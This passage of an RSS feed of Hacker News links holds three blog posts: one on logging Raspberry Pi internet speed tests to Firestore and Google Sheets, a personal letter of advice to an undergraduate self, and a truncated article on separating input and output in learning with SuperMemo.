<figure><pre><code data-lang="json"><span>{</span><span>
  </span><span>"download"</span><span>:</span><span> </span><span>30421342.381950885</span><span>,</span><span>
  </span><span>"upload"</span><span>:</span><span> </span><span>19739920.106307168</span><span>,</span><span>
  </span><span>"ping"</span><span>:</span><span> </span><span>30.315</span><span>,</span><span>
  </span><span>"server"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"url"</span><span>:</span><span> </span><span>"http://speed.telexair.in:8080/speedtest/upload.php"</span><span>,</span><span>
    </span><span>"lat"</span><span>:</span><span> </span><span>"12.9716"</span><span>,</span><span>
    </span><span>"lon"</span><span>:</span><span> </span><span>"77.5946"</span><span>,</span><span>
    </span><span>"name"</span><span>:</span><span> </span><span>"Bangalore"</span><span>,</span><span>
    </span><span>"country"</span><span>:</span><span> </span><span>"India"</span><span>,</span><span>
    </span><span>"cc"</span><span>:</span><span> </span><span>"IN"</span><span>,</span><span>
    </span><span>"sponsor"</span><span>:</span><span> </span><span>"TelexAir Telecom Pvt Ltd"</span><span>,</span><span>
    </span><span>"id"</span><span>:</span><span> </span><span>"14493"</span><span>,</span><span>
    </span><span>"host"</span><span>:</span><span> </span><span>"speed.telexair.in:8080"</span><span>,</span><span>
    </span><span>"d"</span><span>:</span><span> </span><span>0.10306914928173351</span><span>,</span><span>
    </span><span>"latency"</span><span>:</span><span> </span><span>30.315</span><span>
  </span><span>},</span><span>
  </span><span>"timestamp"</span><span>:</span><span> </span><span>"2020-09-18T16:47:59.425361Z"</span><span>,</span><span>
  </span><span>"bytes_sent"</span><span>:</span><span> </span><span>24870912</span><span>,</span><span>
  </span><span>"bytes_received"</span><span>:</span><span> </span><span>38423553</span><span>,</span><span>
  </span><span>"share"</span><span>:</span><span> </span><span>null</span><span>,</span><span>
  </span><span>"client"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"ip"</span><span>:</span><span> </span><span>"X.X.X.X"</span><span>,</span><span>
    </span><span>"lat"</span><span>:</span><span> </span><span>"12.9719"</span><span>,</span><span>
    </span><span>"lon"</span><span>:</span><span> </span><span>"77.5937"</span><span>,</span><span>
    </span><span>"isp"</span><span>:</span><span> </span><span>"ACT Fibernet"</span><span>,</span><span>
    </span><span>"isprating"</span><span>:</span><span> </span><span>"3.7"</span><span>,</span><span>
    </span><span>"rating"</span><span>:</span><span> </span><span>"0"</span><span>,</span><span>
    </span><span>""</span><span>:</span><span> </span><span>"0"</span><span>,</span><span>
    </span><span>"ispulavg"</span><span>:</span><span> </span><span>"0"</span><span>,</span><span>
    </span><span>"loggedin"</span><span>:</span><span> </span><span>"0"</span><span>,</span><span>
    </span><span>"country"</span><span>:</span><span> </span><span>"IN"</span><span>
  </span><span>}</span><span>
</span><span>}</span></code></pre></figure>

<p>So I wrote a simple python script to capture this output.</p>

<figure><pre><code data-lang="python"><span>import</span> <span>subprocess</span>
<span>import</span> <span>json</span>

<span>speed_test</span> <span>=</span> <span>subprocess</span><span>.</span><span>Popen</span><span>([</span><span>'speedtest-cli'</span><span>,</span> <span>'--json'</span><span>],</span> 
    <span>stdout</span><span>=</span><span>subprocess</span><span>.</span><span>PIPE</span><span>,</span> <span>stderr</span><span>=</span><span>subprocess</span><span>.</span><span>STDOUT</span><span>)</span>
<span>out</span><span>,</span> <span>err</span> <span>=</span> <span>speed_test</span><span>.</span><span>communicate</span><span>()</span>
<span>speed_dict</span> <span>=</span> <span>json</span><span>.</span><span>loads</span><span>(</span><span>out</span><span>)</span>

<span>print</span><span>(</span><span>'download='</span> <span>+</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'download'</span><span>])))</span>
<span>print</span><span>(</span><span>'upload='</span> <span>+</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'upload'</span><span>])))</span>
<span>print</span><span>(</span><span>'time='</span> <span>+</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>now</span><span>)))</span></code></pre></figure>

<h2 id="store-measurments-in-a-firestore-db">Store measurments in a Firestore DB</h2>
<p>A bit of code will push this to a Firestore DB. Google lets you use a Firestore DB for free if you stay within a reasonable number of operations per day.</p>

<figure><pre><code data-lang="python"><span>from</span> <span>google.cloud</span> <span>import</span> <span>firestore</span>

<span>now</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>
<span>db</span> <span>=</span> <span>firestore</span><span>.</span><span>Client</span><span>()</span>
<span>doc_ref</span> <span>=</span> <span>db</span><span>.</span><span>collection</span><span>(</span><span>'speedtests'</span><span>).</span><span>document</span><span>(</span><span>str</span><span>(</span><span>int</span><span>(</span><span>now</span><span>)))</span>
<span>doc_ref</span><span>.</span><span>set</span><span>({</span>
    <span>'download'</span><span>:</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'download'</span><span>])),</span>
    <span>'upload'</span><span>:</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'upload'</span><span>])),</span>
    <span>'ping'</span><span>:</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'ping'</span><span>])),</span>
    <span>'server_url'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'url'</span><span>]),</span>
    <span>'server_lat'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'lat'</span><span>]),</span>
    <span>'server_lon'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'lon'</span><span>]),</span>
    <span>'server_name'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'name'</span><span>]),</span>
    <span>'server_country'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'country'</span><span>]),</span>
    <span>'server_cc'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'cc'</span><span>]),</span>
    <span>'server_sponsor'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'sponsor'</span><span>]),</span>
    <span>'server_id'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'id'</span><span>]),</span>
    <span>'server_host'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'host'</span><span>]),</span>
    <span>'server_distance'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'d'</span><span>]),</span>
    <span>'server_latency'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'server'</span><span>][</span><span>'latency'</span><span>]),</span>
    <span>'bytes_sent'</span><span>:</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'bytes_sent'</span><span>])),</span>
    <span>'bytes_received'</span><span>:</span> <span>str</span><span>(</span><span>int</span><span>(</span><span>speed_dict</span><span>[</span><span>'bytes_received'</span><span>])),</span>
    <span>'client_ip'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'ip'</span><span>]),</span>
    <span>'client_lat'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'lat'</span><span>]),</span>
    <span>'client_lon'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'lon'</span><span>]),</span>
    <span>'client_isp'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'isp'</span><span>]),</span>
    <span>'client_isp_rating'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'isprating'</span><span>]),</span>
    <span>'client_rating'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'rating'</span><span>]),</span>
    <span>'client_ispdlavg'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'ispdlavg'</span><span>]),</span>
    <span>'client_ispulavg'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'ispulavg'</span><span>]),</span>
    <span>'client_loggedin'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'loggedin'</span><span>]),</span>
    <span>'client_country'</span><span>:</span> <span>str</span><span>(</span><span>speed_dict</span><span>[</span><span>'client'</span><span>][</span><span>'country'</span><span>]),</span>
<span>})</span></code></pre></figure>

<h2 id="take-measurements-every-30-minutes">Take measurements every 30 minutes</h2>
<p>Then I added this to <code>crontab</code> so it runs every 30 minutes.</p>

<figure><pre><code data-lang="shell"><span>GOOGLE_APPLICATION_CREDENTIALS</span><span>=</span><span>"/home/pi/speed-monitor/speed-db-key.json"</span>
<span>*</span>/30 <span>*</span> <span>*</span> <span>*</span> <span>*</span> python3 speed-monitor.py</code></pre></figure>

<h2 id="pulling-records-from-firestore-to-google-sheets">Pulling records from Firestore to Google Sheets</h2>
<p>I let this run for a bit over 24 hours, and got 52 readings. Next step was to write a small Google Apps Script to pull these records from Firestore and put them in rows in a Google Sheets worksheet.</p>

<figure><pre><code data-lang="javascript"><span>function</span> <span>copyFromFirestore</span><span>()</span> <span>{</span>
  <span>const</span> <span>firestore</span> <span>=</span> <span>FirestoreApp</span><span>.</span><span>getFirestore</span><span>(</span><span>email</span><span>,</span> <span>key</span><span>,</span> <span>projectId</span><span>);</span>
  <span>const</span> <span>allDocuments</span> <span>=</span> <span>firestore</span><span>.</span><span>getDocuments</span><span>(</span><span>"</span><span>speedtests</span><span>"</span><span>);</span>
  <span>Logger</span><span>.</span><span>log</span><span>(</span><span>'</span><span>num=</span><span>'</span> <span>+</span> <span>allDocuments</span><span>.</span><span>length</span><span>);</span>
  <span>for</span><span>(</span><span>i</span><span>=</span><span>0</span><span>;</span><span>i</span><span>&lt;</span><span>allDocuments</span><span>.</span><span>length</span><span>;</span><span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>var</span> <span>sheet</span> <span>=</span> <span>SpreadsheetApp</span><span>.</span><span>getActiveSheet</span><span>();</span>
    <span>sheet</span><span>.</span><span>appendRow</span><span>([</span><span>allDocuments</span><span>[</span><span>i</span><span>].</span><span>createTime</span><span>,</span> <span>allDocuments</span><span>[</span><span>i</span><span>].</span><span>fields</span><span>.</span><span>download</span><span>.</span><span>stringValue</span><span>,</span> <span>allDocuments</span><span>[</span><span>i</span><span>].</span><span>fields</span><span>.</span><span>upload</span><span>.</span><span>stringValue</span><span>,</span> <span>allDocuments</span><span>[</span><span>i</span><span>].</span><span>fields</span><span>.</span><span>ping</span><span>.</span><span>stringValue</span><span>]);</span>
  <span>}</span>
<span>}</span></code></pre></figure>

<p>Then it’s simple to chart the speeds and latency over the roughly 24-hour period.</p>

<p><img src="https://perryizgr8.github.io/images/speedtest.png" alt="Speed test chart"></p>

<h2 id="problem-in-the-setup">Problem in the setup</h2>
<p>This chart shows that my download speed varies between 20 to 35Mbps, and the upload varies between 15 to 20Mbps. This is significantly lower than the 100Mbps symmetric I pay for. If you go back to the first test result I showed in this post, which I ran from my laptop, it shows 83Mbps download and 60Mbps upload. So why this discrepancy?</p>

<p>I suspect this is where my old Pi is showing its age. Even though it is connected to my router using a 100Mbps ethernet cable, the hardware is simply not powerful enough to fully saturate the connection. So I will not be running this setup anymore. Maybe one day I’ll get a newer model and run this for a longer duration. That would hopefully reveal some interesting patterns.</p>

<p>Another concern of mine is the amount of data transfered. Each run of the test consumes around 60MB of data. Running it every half hour for a month would use up ~85GB. That is close to 17% of my plan’s monthly quota. That would probably push me over the limit and cause the connection to slow down to something unusable like 1Mbps.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://perryizgr8.github.io/raspberry-pi/2020/09/20/monitoring-speed-rpi.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540344</guid>
            <pubDate>Mon, 21 Sep 2020 06:12:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Letter to My Undergraduate Self]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24540343">thread link</a>) | @prabhupant
<br/>
September 20, 2020 | https://prabhupant.github.io/2020/09/15/letter-to-my-undergraduate-self.html | <a href="https://web.archive.org/web/*/https://prabhupant.github.io/2020/09/15/letter-to-my-undergraduate-self.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Going to a university is important because you not only learn about the subject of your choice to build a foundation for your career, but also it is the place where your ideas and opinions about the world are formed and your personality is developed. For many it is the beginning of their independent life and teaches them how to overcome hurdles on their own.</p>

<p>I loved my time in my undergraduate. Not because my college was great or anything, it was hardly average, but because I made many great friends for life, tasted independence and the cost associated with it, and tried to explore many new things and failed miserably or gave up halfway in most of them. But when I look back, there are some things which I feel I could have done way better and some amazing opportunities which I completely let pass by me. I am writing this to myself to introspect where I could have improved back then so that I can improve right now and if someone else finds this useful, I will be a happy person.</p>

<p>Don’t take this as a structure or guiding principle of your university life. It is your youth life and you have to shape it yourself, not let others shape it for you because if you let others shape your life for you then you are not learning anything. On top of that, you are losing your freedom and a major part of yourself. I am a believer in Herman Hesse’s philosophy (in his book Siddhartha). Learn from everything that comes to you, analyse it, absorb the good things, let go of the negative things, and then go on your journey to find what you are and explore your life, because it is yours. Remember, the meaning of life is not to copy a billionaire or a sports person and become successful like them. The meaning of life is - why. Why is this your life? Why do you want to live your life? Be yourself, not imitate others.</p>

<p>In Zen Buddhism there is a saying (or <em>koan</em> as they call it) which I truly love. “When you meet the Buddha, kill him.” What it means is be open and courageous even towards things you don’t know. Don’t follow Buddha as is, rather learn from him and go on your own path. Resume your own Buddha. There is no path in life. If there is a path in your life, you are living someone else’s life.</p>

<p>Here are some of things which improved me and I recommend them to everyone.</p>



<p>The habit that brought about the biggest positive change in me is reading which I inculcated in myself during my sophomore year. I used to read books prior to that as well but reading wasn’t such a habit per se. I barely read 3-4 books a year. If at that point you had asked me which was the last book I had read, I would have said 1984 by George Orwell, which I had read almost an year before.</p>

<p>I started with a goal in mind - 50 books in 2017 - and I was lucky enough that the first book I picked, Steve Jobs by Walter Issacson, really inspired me to do what I wanted to do.</p>

<p>Why I recommend reading as habit to everyone is because of three reasons (or positive changes which I have felt in myself) -</p>

<ol>
  <li>
    <p><strong>Reading teaches patience -</strong> At first, it is very difficult to sit down with a book for 30 minutes and focus on nothing but the text. You won’t be able to concentrate properly because there are too many distractions around and the biggest is the mobile phone and social media. In terms of negative effects on patience, mobile phones and social media train your mind towards short and quick sources of information, like Facebook notifications, news pop-ups, etc, and because of that many find it really hard to sit calmly through a book. Ask yourself, can you or your friends sit alone for an hour without getting impatient about not checking their phones? If the answer is no, you know you lack self-control and patience. If the answer is yes, you are doing quite well and you have an amazing company of people!</p>
  </li>
  <li>
    <p><strong>You learn a lot -</strong> Reading any book, irrespective of the genre, teaches you how to frame your thoughts and convey them, increases your vocabulary, improves your grammar and teaches you how to write. Reading non-fiction especially teaches you about things like history, science, and great people, for example. No matter which genre you are reading, you end up learning a lot of things. The only genre of books that I don’t recommend is cheap modern fiction because they do not make any sense to me - there is no literature in them.</p>
  </li>
  <li>
    <p><strong>You learn about yourself -</strong> Reading is like meditation. It is a conversation between yourself and the writer. Fully absorbing the meaning of the words requires a certain amount of focus. In understanding what the writer is trying to convey, you will sometimes realise that you know so little about this topic or your opinions about a particular topic is narrow, biased etc. This introspection opens up a tunnel to your consciousness and helps to clear your thinking. I believe this introspection is essential for assessing yourself.</p>
  </li>
</ol>



<p>Reality is neutral. The world is how we perceive it to be. It is only after changing your attitude that you will learn to be welcoming towards new challenges and be positive. Three main changes in my attitude which really made me better -</p>

<ol>
  <li>
    <p>Be curious about everything and learn new things, not just the things that are related to your field of study, but also other disparate fields. For example, if you are studying computer science, learn psychology and try to see computer science through glasses of psychology.</p>
  </li>
  <li>
    <p>Be welcoming towards change. Life is like a sine graph, it is never constant. Changes will come and it is our attitude that defines how we deal with it.</p>
  </li>
  <li>
    <p>Be responsible for your actions and life. Don’t blame your failures on circumstances or family, especially on your parents. They have tried hard and sacrificed a lot to make sure you become a better person - better than they are.</p>
  </li>
</ol>



<p>We are social animals and as social animals one of the most important qualities that any of us can possess is to think logically and in a heuristic way by taking first principles into considerations and write down clearly what you think and be able to speak them out cogently. These skills are essential in modern day and age because society is so intertwined that you will have to constantly communicate with others and persuade them if you want to progress towards your goal. Interviews, persuasion, salary hikes, relationships, etc are just some examples where a good communication skill can pay off huge dividends.</p>

<p>This is one field where I still lack. What works best, according to me, is to write daily for at least 30 mins and try to speak to yourself what you just read in a book or article. It improves the clarity of the chain of your thoughts and also helps to shuffle and select striking points.</p>



<p>You cannot get complete freedom until you take control of certain aspects of your life and don’t worry about things that are not in your control.</p>

<p>What I found most helpful was to create a schedule and follow it. At first it takes a lot of effort to adjust yourself accordingly but after sometime you find it quite revitalizing. At first you might be able to stick to only 50% of your schedule and that’s fine. Try to make it 55% the next day. Remember the process to follow a schedule is incremental not instantaneous. Some unprecedented things will always come to break you out of the schedule and that is completely okay. Life is, after all, like a wave with ups and downs, not a still ocean. From my experience, the optimal stick-to-itiveness to a schedule is around 90% and I don’t think anyone can stick to their schedule 100% of the time because life is serendipitous.</p>



<p>Occasional procrastination is normal but if you are procrastinating everytime, skipping your work to nap for thirty minutes, or your tasks in your to-do-list are increasing constantly, then you are procrastinating and need to get back on the driver’s seat.</p>

<p>Some things I found quite useful to tackle procrastination -</p>

<ol>
  <li>
    <p><strong>There is no fun in procrastination -</strong>  For example, if you complete your work on time, you get more time to focus on your hobbies or watch a movie. Even resting with an empty mind is way better than pretending to work.</p>
  </li>
  <li>
    <p><strong>Making a schedule -</strong> Schedule really helps in arranging your day to utilise it to the fullest. That is why many CEOs have such a tight schedule to get maximum out of their day. Also, schedule provides a sort of supervision that helps to make sure you are on the correct path.</p>
  </li>
  <li>
    <p><strong>Cut social media -</strong> One of the best things I have done in my life is delete Facebook. But eventually I got addicted to Twitter and Instagram and it was consuming a lot of my time, focus and emotions and increased my procrastination. The thing that works for me is to open Twitter and Instagram only in a half an hour window during the evening coffee break.</p>
  </li>
</ol>



<p>Explore things that are around you, collect experiences, travel, be in nature. I have been to many trips but there were a couple of them I missed and I still regret them. Nevertheless, it’s never too late to plan another trip.</p>



<p>If you think about the future, you will be constantly worried. If you think about the past, you will be constantly regretful. What has happened and will happen is not in your control. What is in your control is what can happen.</p>

<p>I have lived a substantial chunk of my undergraduate life thinking about how things could have been or how things should have been but I was rarely mindful of how things actually are. Having this kind of mental state is akin to living in a pseudo-simulation, where you are living in a self-created illusion which seems real to you but, on the contrary, reality becomes an illusion.</p>

<p>Learn from the past, be mindful and conscious of the things in hand, and shape your future.</p>

<p>Be lively, fun loving. Search for love, spread love.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://prabhupant.github.io/2020/09/15/letter-to-my-undergraduate-self.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540343</guid>
            <pubDate>Mon, 21 Sep 2020 06:12:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Input and Output in Learning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24540322">thread link</a>) | @rajlego
<br/>
September 20, 2020 | https://experimental-learning.com/articles/Input-and-Output-in-Learning | <a href="https://web.archive.org/web/*/https://experimental-learning.com/articles/Input-and-Output-in-Learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
    <i></i> Author: Jamesb  |
    <i></i> Created: 2020-08-20 |
    <i></i> Last Edited: 2020-08-20  |
    <i></i> Finished Confidence: 6
</p><div>
            


<meta charset="UTF-8"><meta name="viewport" content="width=device-width initial-scale=1">
<title>The Input Output Distinction in Learning</title>
<h2>Value and Cost in Learning</h2>
<p>Learners are goal-driven decision-makers. They invest their limited time, energy and other resources in learning in order to gain in some way from that investment. Therefore a rational learning system must record, analyze and balance value and cost to maximally fulfil the user's goals in learning.</p>
<p>Learning systems that do not consider value and cost will direct learners to make suboptimal  investments in learning.</p>
<h3>Value</h3>
<h4>The Subjectivity of Value</h4>
<p>Value is <strong>subjective</strong>. That means two different learners may have completely different "value functions".</p>
<p>My personal theory of the value of learning can be summarized as:</p>
<p><em>Learning is worthwhile insofar as it contributes to creative output which is shared into the real world.</em></p>
<p>The purpose behind the separation of learning processes into Input and Output (the subject of this article) is to make "creating value" (as I define it) easier.</p>
<h3>Cost</h3>
<p><img src="https://experimental-learning.com/static/images/input-output/time-allocation.png" alt="time-allocation"></p>
<p><em>Learners are resource constrained and must carefully allocate their limited resources to maximally satisfy their subjective theory of value.</em></p>
<p>Learning processes all have associated costs. For example:</p>
<ul>
<li>Time (the ultimate resource)</li>
<li>Energy</li>
<li>Money</li>
<li>...</li>

</ul>
<p>The purpose behind the separation of learning processes into Input and Output (the subject of this article) is to minimize the cost of sharing creative output.</p>
<h4>The Rational Analysis of Learning</h4>
<p>Specific value functions may differ between individuals - not everyone will agree that creative output is the ultimate purpose of learning, however, the maximization of value (however it is defined) per unit of cost is a goal shared between all rational learners.</p>
<p>The goal of the Rational Analysis of Learning is to record, balance and optimize a learning system in accordance with the learner's value function.</p>
<h2>Input Output vs Passive Active</h2>
<p>One distinction people often make when discussing learning processes is the difference between Passive and Active learning. It is useful to review, compare and contrast the Passive-Active model with my Input-Output model.</p>
<p>Passive learning is characterized by passive consumption of information.</p>
<p>Examples of passive learning techniques include:</p>
<ul>
<li>Reading books</li>
<li>Listening to podcasts</li>
<li>Watching lectures</li>

</ul>
<p>Active learning strategies involve retrieval of information in response to some stimulus.</p>
<p>Examples of Active learning techniques include:</p>
<ul>
<li>Textbook Exercises </li>
<li>SRS repetitions (active recall)</li>
<li>Programming Projects</li>

</ul>
<p>There is also a middle ground containing learning processes that require both passive and active components. </p>
<p>The Passive-Active distinction can be represented as an overlapping Venn diagram.</p>
<p><img src="https://experimental-learning.com/static/images/input-output/Passive-Active-learning.png" alt="Passive-Active-learning"></p>
<p>While the passive-active model is useful, I prefer to categorize learning processes into "Input" and "Output" in order to integrate the passive-active distinction with my theory regarding the value of learning.</p>
<p><img src="https://experimental-learning.com/static/images/input-output/Input-output-venn.png" alt="Input-output-venn"></p>
<h3>Input Output: A Worthwhile Abstraction</h3>
<p>The idea behind splitting learning processes into Input and Output is to distinguish more critically between those active learning processes that result in "real world" creative output (my subjective understanding of the value of learning) vs those that do not. </p>
<p>This model is useful to me because:</p>
<ol start="">
<li>All learning processes have an Input component, an Output component or both. Input and Output are broadly applicable concepts, similar to the concepts of "stimulus" and "response" in Psychology.</li>
<li><em>Most</em> of my learning can be divided cleanly into Input or Output.</li>
<li>The Input Output model integrates with my understanding of cost and value.</li>

</ol>
<h3>Input</h3>
<p>In addition to the "obvious" input activities like reading, watching and listening, my definition of Input <strong>includes</strong> certain Active learning processes, such as textbook exercises and SRS repetitions.</p>
<p><img src="https://experimental-learning.com/static/images/input-output/Input-with-extract-without-output.png" alt="Input-output-venn"></p>
<p><em>An Input process adds a new stream of information into the brain. Through generalization, the information stream is filtered and condensed, concepts and abstract rules are extracted and new knowledge is integrated into the brain's latticework of prior knowledge.</em></p>
<p>According to my subjective "value function", no value is created until my knowledge is employed in some process that results in creative output into the real world. Since no Input processes satisfy that requirement, none of them create value by themselves.</p>
<h4>The Potential to Create Output</h4>
<p>Input processes may <strong>directly or indirectly</strong> increase my ability to produce Output. </p>
<ul>
<li>Investing time and energy into Input activities gives me the <strong>potential</strong> to "create value".</li>
<li>Some Input processes increase your <strong>ability</strong> to "create value" more than others.</li>
<li>Certain Input processes give you the <strong>option</strong> to create large amounts of value, but at a steep "cost".</li>

</ul>
<p>A rational learning system...</p>
<ol start="">
<li>Adjusts the ratio of time and other resources spent between Input and Output processes to maximize "value creation".</li>
<li>Prioritizes between different Input and Output processes to create the the most value for the least cost.</li>

</ol>
<h3>Output</h3>
<p>My understanding of Output excludes those Active learning processes that do not result in "creative output that is shared into the real world".</p>
<p><img src="https://experimental-learning.com/static/images/input-output/Input-with-extract-with-output.png" alt="Input-output-venn"></p>
<p><em>The information stream, having been filtered, condensed, extracted and assimilated, provides a meaningful association that results in a creative solution to some problem which you consequently share with the world.</em></p>
<p>Output processes are what I define as the "value creation" part of learning.</p>
<p>They represent "creative output into the real world".</p>
<p>Examples of processes I believe satisfy that definition:</p>
<ul>
<li>Writing plugins for SuperMemoAssistant that are shared with other SuperMemo users.</li>
<li>Podcasting.</li>
<li>Writing and sharing this blog post.</li>

</ul>
<p>Examples of processes I believe do NOT satisfy that definition:</p>
<ul>
<li>Textbook exercises.</li>
<li>Programming tutorials.</li>
<li>Exams.</li>

</ul>
<h3>Input Output: A Design Pattern</h3>
<p>The Input Output distinction can be expressed as a practical system of organization for learning. The following is an implementation of the Input Output Design Pattern in <span name="SuperMemo">SuperMemo</span>.</p>
<p><img src="https://experimental-learning.com/static/images/input-output/kt-input-output.png">  </p>
<p>All of the elements in my knowledge tree are divided into two folders underneath the root node - Input and Output. </p>
<p>This separation is convenient for the following reasons: </p>
<ul>
<li>It allows for separation between elements that are used for Input processes (eg. Wikipedia articles) and elements that are used for Output processes (eg. Incremental Writing topics), which is convenient from an organization standpoint.</li>
<li>It does not require you to silo Input material and creative Output material into separate collections. This improves the creative process by increasing the probability of making serendipitous associations between concepts.</li>
<li>The pattern emphasizes neural linking to share Input material and concepts between multiple projects, increasing modularity and reducing cost.</li>
<li>It supports a rational analysis of learning by allowing you to measure the ratio of time spent between Input and Output processes, based on time spent in the Input branch vs time spent in the Output branch. (I will discuss this more in a future article).</li>

</ul>
<h4>Output Branch</h4>
<p>The output branch consists of folders or concepts, each representing a piece of creative output in progress.</p>
<p>In the picture you can see how I organized the branch representing this article within the Output branch:</p>
<p><img src="https://experimental-learning.com/static/images/input-output/kt-project-node.png">  </p>
<p>I choose to use concepts as the root element for projects I'm actively working on rather than dismissed topics because of the ability to use neural links.</p>
<p>Using neural links allows me to 1) avoid moving material back and forth between the Input folder and the Output folder, 2) enables me to share useful material between multiple active projects and 3) allows me to use neural review to explore related ideas and projects.</p>
<h5>Output Tasks</h5>
<p>Rather than using a separate task list for each project, I'm currently using one 'global' task list for the Output branch. I move individual tasks into "Tasks" folders based on the project.</p>
<p>Advantages and disadvantages of a global Output task list:</p>
<figure><table>
<thead>
<tr><th>Advantages</th><th>Disadvantages</th></tr></thead>
<tbody><tr><td>Easier to compare the priority of tasks across multiple projects - can open all Output tasks in a Task list browser and sort by priority.</td><td>More difficult to compare the priority of tasks within a single project - have to use the subset browser.</td></tr></tbody>
</table></figure>
<h4>Input Branch</h4>
<p>The input branch is quite chaotic. I haven't spent much time organizing it. It might not be worth the time it would require to organize it properly.</p>
<p><img src="https://experimental-learning.com/static/images/input-output/kt-input-branch.png">  </p>
<h5>Input Tasks</h5>
<p>I keep a 'global' input task list for recommended content. Recommended content includes:</p>
<ul>
<li>Articles</li>
<li>Podcasts</li>
<li>Lecture series</li>
<li>Documentaries</li>
<li>A list of potential concepts / keywords to learn.</li>
<li>Lists of interesting / inspiring people to learn about</li>
<li>Biographies</li>

</ul>
<h4>Some Observations</h4>
<ol start="">
<li><p>One interesting neural link I made was between the concept representing this article and a concept called Knowledge Tree Design Patterns. I realized that the article's content, plus any feedback from readers could be reused as input into a broader, more general article on Knowledge Tree Design Patterns.</p>
<p><img src="https://experimental-learning.com/static/images/input-output/neural-link.png">  </p>
<p>In this way, the entire learning process can be thought of a cycle where Input processes support creative output through Output processes, which in turn can be recycled into Input...</p>
</li>
<li><p>Initially I found it unintuitive to use neural links, as opposed to moving Input material directly into the Output folder since I was more familiar with the move function than neural linking. Later I decided that there are potentially many projects that could use the same Input material, so neural links would make it simpler to share material in the Input folder with multiple active projects.</p>
</li>
<li><p>Rather than classifying creative output into folders like "Incremental writing" or "podcast", I found it more valuable to make the creative output concepts medium-agnostic. This encourages me to share the creative output and get feedback from multiple platforms.</p>
</li>

</ol>
<h5>Neural Links</h5>
<p>The emphasis on neural links in this pattern is useful because it will build up the number of high value links in your collection, making …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://experimental-learning.com/articles/Input-and-Output-in-Learning">https://experimental-learning.com/articles/Input-and-Output-in-Learning</a></em></p>]]>
            </description>
            <link>https://experimental-learning.com/articles/Input-and-Output-in-Learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540322</guid>
            <pubDate>Mon, 21 Sep 2020 06:08:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: An Open Source Memex POC]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24540284">thread link</a>) | @steve1820
<br/>
September 20, 2020 | http://steveliu.co/memex | <a href="https://web.archive.org/web/*/http://steveliu.co/memex">archive.org</a>
